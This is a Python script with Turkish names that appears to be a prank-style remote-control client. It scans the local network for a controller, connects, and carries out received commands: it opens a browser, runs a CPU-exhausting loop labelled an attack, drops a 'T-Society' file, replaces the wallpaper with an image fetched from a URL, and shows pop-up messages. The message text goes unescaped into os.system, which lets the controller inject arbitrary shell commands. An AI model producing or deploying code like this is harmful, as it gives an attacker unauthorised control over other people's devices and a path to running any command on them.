import socket
import platform
import os
import urllib.request
import ctypes

def cihaz_tipi():
    sistem = platform.system()
    if sistem == "Linux":
        if "Android" in platform.platform():
            return "Telefon"
        else:
            return "Linux PC"
    elif sistem == "Windows":
        return "Windows PC"
    elif sistem == "Darwin":
        return "Mac"
    return "Bilinmeyen"

def arkaplan_degistir(url):
    try:
        urllib.request.urlretrieve(url, "arkaplan.jpg")
        if cihaz == "Telefon":
            os.system("termux-wallpaper -f arkaplan.jpg")
        elif cihaz == "Windows PC":
            yol = os.path.abspath("arkaplan.jpg")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3)
        elif cihaz == "Linux PC":
            os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg")
        s.send("[✓] Arka plan degistirildi\n".encode())
    except:
        s.send("[!] Arka plan degistirilemedi\n".encode())

def google_ac():
    if cihaz == "Telefon":
        os.system("termux-open-url https://www.google.com")
    elif cihaz == "Windows PC":
        os.system("start https://www.google.com")
    elif cihaz == "Linux PC":
        os.system("xdg-open https://www.google.com")
    s.send("[✓] Google acildi\n".encode())

def dosya_olustur():
    with open("saka.txt", "w") as f:
        f.write("T-Society buradaydı!")
    s.send("[+] Dosya olusturuldu\n".encode())

def saka_modu(mesaj):
    if cihaz == "Telefon":
        os.system(f'termux-notification --title "Şaka" --content "{mesaj}"')
    elif cihaz == "Windows PC":
        os.system(f'msg * "{mesaj}"')
    elif cihaz == "Linux PC":
        os.system(f'notify-send "Şaka" "{mesaj}"')
    s.send("[!] Şaka modu mesajı gönderildi!\n".encode())

def saldiri_yap():
    for _ in range(1000000):
        _ = 9 ** 999
    s.send("[✓] Cihaz kasarildi\n".encode())

# === IP TARAMA VE BAĞLANTI ===
cihaz = cihaz_tipi()
modem_ip = input("Modem IP gir (örnek 192.168.1.1): ")
port = int(input("Port gir: "))
modem_base = ".".join(modem_ip.split(".")[:-1])

for i in range(2, 255):
    hedef_ip = f"{modem_base}.{i}"
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((hedef_ip, port))
        s.send(f"[+] {cihaz} baglandi.".encode())
        print(f"[✓] Bağlandı: {hedef_ip}")
        
        # === KOMUT DÖNGÜSÜ ===
        while True:
            komut = s.recv(1024).decode().strip()
            if komut == "google":
                google_ac()
            elif komut == "saldiri":
                saldiri_yap()
            elif komut == "dosya":
                dosya_olustur()
            elif komut.startswith("arkaplan "):
                _, url = komut.split(" ", 1)
                arkaplan_degistir(url)
            elif komut.startswith("saka "):
                _, mesaj = komut.split(" ", 1)
                saka_modu(mesaj)
            elif komut == "exit":
                s.close()
                break
            else:
                s.send("[!] Bilinmeyen komut\n".encode())
        break
    except:
        print(f"[-] Erişilemedi: {hedef_ip}")
